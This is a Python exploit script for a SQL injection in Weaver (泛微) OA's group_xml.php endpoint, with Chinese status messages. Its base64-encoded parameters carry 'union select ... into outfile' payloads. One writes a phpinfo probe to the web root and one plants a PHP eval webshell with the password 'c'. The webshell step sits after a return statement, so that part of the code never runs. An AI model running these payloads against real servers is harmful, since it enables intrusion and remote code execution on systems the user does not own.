import time
import requests
import urllib3

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())  
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=target_url+'inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgQGV2YWwoJF9QT1NUW2NdKT8+JywyLDMsNCw1LDYsNyw4IGludG8gb3V0ZmlsZSAnLi4vd2Vicm9vdC90ZXN0LnBocCdd'
    vuln_url=target_url+'inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd'
    success_msg1 = now_time() + '[SUCCESS]  存在泛微OA  group_xml SQL注入'
    success_msg2 = now_time() + '[SUCCESS]  上传webshell成功，密码为c:{}'.format(target_url)+'test.php'
    shell_msg = now_time() + ':{}'.format(target_url)+'vulntest.php'
    warning_msg = now_time() + '[WARNING]上传文件失败，原因未知'
    error_msg = now_time() + '[泛微OA  group_xml SQL注入][ERROR][ERROR]目标请求失败'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=20)
        response_poc=requests.get(url=target_url+'vulntest.php', headers=headers, verify=False, timeout=20)
        if response.status_code == 200:
            return success_msg1,shell_msg
            response = requests.get(url= exp_url, headers=headers, verify=False, timeout=20)
            response_exp=requests.get(url=target_url+'test.php', headers=headers, verify=False, timeout=20)
            if response.status_code == 200 and response_exp.status_code == 200:
                return success_msg2
            else:
                return warning_msg
        else:
            return now_time() + " [WARNING]  不存在泛微OA  group_xml SQL注入"
    except:
        return error_msg
    
